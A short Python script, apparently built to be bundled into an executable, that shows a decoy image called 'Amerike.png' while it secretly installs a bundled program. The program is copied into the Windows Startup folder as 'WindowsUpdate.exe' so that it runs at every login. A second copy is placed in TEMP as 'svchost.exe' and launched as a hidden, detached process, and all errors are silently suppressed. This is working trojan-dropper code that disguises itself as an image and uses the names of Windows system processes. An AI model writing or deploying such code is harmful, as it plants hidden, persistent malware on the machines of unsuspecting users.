import os
import subprocess
import sys
import shutil
from PIL import Image

try:
    if hasattr(sys, '_MEIPASS'):
        img = os.path.join(sys._MEIPASS, "Amerike.png")
    else:
        img = "Amerike.png"
    
    if os.path.exists(img):
        Image.open(img).show()
except:
    pass

def install():
    try:
        if hasattr(sys, '_MEIPASS'):
            origen = os.path.join(sys._MEIPASS, "SystemService.exe")
        else:
            origen = "SystemService.exe"
        
        if not os.path.exists(origen):
            return
        
        startup_dir = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
        )
        
        startup_exe = os.path.join(startup_dir, 'WindowsUpdate.exe')
        
        os.makedirs(startup_dir, exist_ok=True)
        
        if not os.path.exists(startup_exe):
            shutil.copy2(origen, startup_exe)
        
        temp_exe = os.path.join(os.getenv('TEMP'), 'svchost.exe')
        shutil.copy2(origen, temp_exe)
        
        subprocess.Popen(
            temp_exe,
            shell=False,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
        )
        
    except:
        pass

install()